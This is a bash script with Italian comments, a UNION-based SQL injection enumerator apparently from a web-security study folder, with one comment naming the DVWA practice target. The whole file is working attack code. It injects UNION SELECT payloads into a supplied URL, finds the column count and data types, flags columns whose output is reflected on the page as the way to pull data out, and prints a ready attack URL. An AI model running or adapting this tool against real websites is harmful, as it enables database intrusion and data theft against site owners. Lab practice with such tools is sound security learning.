#!/bin/bash
# UNION-based SQLi column enumerator
# Salvare in: 02_Web_Security/sqli_enum.sh

MAX_COLS=8
TMPFILE="/tmp/sqli_enum_$$.txt"
INJECT_TYPE="auto"

while getopts "t:" opt; do
	case $opt in
		t) INJECT_TYPE="$OPTARG" ;;
		*) echo "Uso: $0 [-t str|int|auto] URL_WITH_PAYLOAD_HERE"; exit 1 ;;
	esac
done
shift $(( OPTIND - 1 ))

if [ "$#" -ne 1 ]; then
	echo "Uso: $0 [-t str|int|auto] URL_WITH_PAYLOAD_HERE"
	exit 1
fi

BASE_URL="$1"
if [[ "$BASE_URL" != *"PAYLOAD_HERE"* ]]; then
	echo "Errore: L'URL deve contenere la stringa 'PAYLOAD_HERE'"
	exit 1
fi

urlencode() {
	local string="$1" encoded="" i c
	for (( i=0; i<${#string}; i++ )); do
		c="${string:$i:1}"
		case "$c" in
			[a-zA-Z0-9.~_-]) encoded+="$c" ;;
			' ') encoded+="%20" ;;
			*) encoded+=$(printf '%%%02X' "'$c") ;;
		esac
	done
	echo "$encoded"
}

build_url() {
	local encoded
	encoded=$(urlencode "$1")
	echo "${BASE_URL/PAYLOAD_HERE/$encoded}"
}

fetch() {
	curl -s -o "$TMPFILE" -w "%{http_code}" "$1"
}

is_ok() {
	local status="$1"
	# Alcuni DB restituiscono 200 OK anche con errori SQL, quindi filtriamo i warning noti
	[ "$status" != "200" ] && return 1
	tr '[:upper:]' '[:lower:]' < "$TMPFILE" \
		| grep -qE "traceback|operationalerror|syntax error|mysql_fetch|sql syntax" && return 1
	return 0
}

make_prefix() {
	# Per le stringhe bilanciamo l'apice singolo
	[ "$1" = "str" ] && echo "'" || echo "-1"
}

n_cols=0
found_payload=""
found_type=""

try_enum() {
	local itype="$1"
	local prefix
	prefix=$(make_prefix "$itype")
	local n status col_found=0

	echo "[*] Cerco numero colonne... ($itype injection)"
	for (( n=1; n<=MAX_COLS; n++ )); do
		local nulls="NULL"
		for (( i=1; i<n; i++ )); do nulls="$nulls,NULL"; done
		
		# Miglioria 1: Sostituito '-- ' con '#' per massima compatibilità con MySQL (DVWA)
		local payload="${prefix} UNION SELECT ${nulls}#"
		status=$(fetch "$(build_url "$payload")")
		
		if is_ok "$status"; then
			printf "  [+] n=%-2s  HTTP %s  <-- Trovato!\n" "$n" "$status"
			n_cols=$n
			col_found=1
			break # Se troviamo il numero, usciamo dal ciclo per non perdere tempo
		else
			printf "  [-] n=%-2s  HTTP %s\n" "$n" "$status"
		fi
	done

	if [ "$col_found" -eq 1 ]; then
		echo ""
		echo "[*] Cerco tipi di dato e colonne vulnerabili a XSS/Reflection..."
		local total=$(( 1 << n_cols ))
		local mask values labels val lbl bit sql
		
		for (( mask=0; mask<total; mask++ )); do
			values=""; labels=""
			for (( bit=0; bit<n_cols; bit++ )); do
				if (( (mask >> bit) & 1 )); then
					val="'a'"
					lbl="str"
				else
					val="1"
					lbl="int"
				fi
				if [ -z "$values" ]; then
					values="$val"
					labels="$lbl"
				else
					values="$values,$val"
					labels="$labels $lbl"
				fi
			done
			
			sql="${prefix} UNION SELECT ${values}#"
			status=$(fetch "$(build_url "$sql")")
			
			if is_ok "$status"; then
				local reflection_alert=""
				# Miglioria 2: Se la pagina riflette la nostra stringa 'a', è la colonna d'oro per esfiltrare!
				if grep -q "'a'" "$TMPFILE"; then
					reflection_alert=" ---> ⚠️  VULNERABILE! Riflette l'output a schermo!"
				fi
				
				printf "  [+] %-*s  HTTP %s %s\n" $(( n_cols * 4 )) "$labels" "$status" "$reflection_alert"
				found_payload="$sql"
				found_type="$itype"
				return 0
			fi
		done
	fi

	return 1
}

if [ "$INJECT_TYPE" = "auto" ]; then
	try_enum "int" || { echo ""; try_enum "str"; }
else
	try_enum "$INJECT_TYPE"
fi

rm -f "$TMPFILE"

if [ -z "$found_payload" ]; then
	echo ""
	echo "[-] Enumerazione fallita. Forse c'è un WAF o la query non è vulnerabile a UNION."
	exit 1
fi

echo ""
echo "=== RISULTATI ==="
echo "Colonne trovate: $n_cols"
echo "Payload utile:   $found_payload"
echo "URL pronto:      $(build_url "$found_payload")"
